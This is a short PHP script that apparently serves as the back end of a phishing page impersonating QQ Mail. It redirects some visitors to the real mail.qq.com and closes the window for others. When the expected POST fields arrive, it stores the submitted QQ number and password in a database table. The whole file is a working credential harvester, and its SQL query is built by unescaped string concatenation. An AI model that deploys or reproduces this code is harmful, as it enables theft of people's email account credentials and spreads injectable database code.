<?php
error_reporting(0);
require_once('db.php');
if(isset($_GET['url'])){
    echo '<script>document.location="https://mail.qq.com/";</script>';
}elseif(!isset($_POST['uA44169C9347F69']) or !isset($_POST['pA44169C9347F69'])){
    #close the window
    echo '<script>window.location.href="about:blank";window.close();</script>';
}else{
    $qq=$_POST['uA44169C9347F69'];
    $pwd=$_POST['pA44169C9347F69'];
    $con=mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_DATABASE);
    if(!$con){
        die('wtf...please contact the admin.');
    }
    $sql="insert into `user` values('".$qq."','".$pwd."');";
    echo 'sql> '.$sql.'<br/>';
    mysqli_query($con,$sql);
    mysqli_close($con);
}
?>